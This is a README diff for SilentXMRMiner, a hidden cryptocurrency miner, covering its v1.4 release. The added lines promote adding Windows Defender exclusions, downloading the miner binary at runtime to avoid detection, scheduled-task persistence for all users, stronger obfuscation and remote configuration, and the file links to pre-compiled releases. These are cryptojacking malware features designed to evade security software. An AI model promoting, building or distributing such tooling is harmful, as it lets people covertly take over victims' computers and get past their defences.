@@ -1,7 +1,7 @@
 
 <img src="https://github.com/UnamSanctam/SilentXMRMiner/blob/master/SilentXMRMiner.png?raw=true">
 
-# SilentXMRMiner v1.3.4 - Based on Lime Miner v0.3
+# SilentXMRMiner v1.4 - Based on Lime Miner v0.3
 
 Can mine all the following algorithms and thus all the cryptocurrencies that use them: **cn/upx2**, **argon2/chukwav2**, **cn/ccx**, **kawpow**, **rx/keva**, **astrobwt**, **cn-pico/tlo**, **rx/sfx**, **rx/arq**, **rx/0**, **argon2/chukwa**, **argon2/wrkz**, **rx/wow**, **cn/fast**, **cn/rwz**, **cn/zls**, **cn/double**, **cn/r**, **cn-pico**, **cn/half**, **cn/2**, **cn/xao**, **cn/rto**, **cn-heavy/tube**, **cn-heavy/xhv**, **cn-heavy/0**, **cn/1**, **cn-lite/1**, **cn-lite/0** and **cn/0**.
 
@@ -23,6 +23,10 @@ Can mine all the following algorithms and thus all the cryptocurrencies that use
 
 * Remote Configuration - Can get the connection settings remotely from a URL at each startup
 
+* Bypass Windows Defender - Adds exclusions into Windows Defender for the general folders the miner uses
+
+* Online Downloader - Can download the miner binary during runtime (from GitHub) to greatly decrease file size and detections
+
 ## Downloads
 
 Pre-Compiled: https://github.com/UnamSanctam/SilentXMRMiner/releases
@@ -37,6 +41,14 @@ You can find the new wiki [here](https://github.com/UnamSanctam/SilentXMRMiner/w
 
 ## Changes
 
+### v1.4 (05/07/2021)
+**v1.4 is the final update before the new, greatly improved unified miner that I'm working on.**
+* Added the Online Downloader option that makes the miner download the miner binary (from GitHub) during runtime to greatly decrease file size (to less then 100kb) and detections - Also added a cache so that it won't have to download the miner on every start
+* Made the Task Scheduler task start for all users
+* Improved Watchdog program flow
+* Renamed "Kill" Windows Defender to Bypass Windows Defender to better represent the new functionality
+* Improved obfuscation/encryption
+* Improved overall code
 ### v1.3.4 (14/05/2021)
 * Made the Windows Defender Killer less intrusive, ironically to reduce detections
 ### v1.3.3 (13/05/2021)
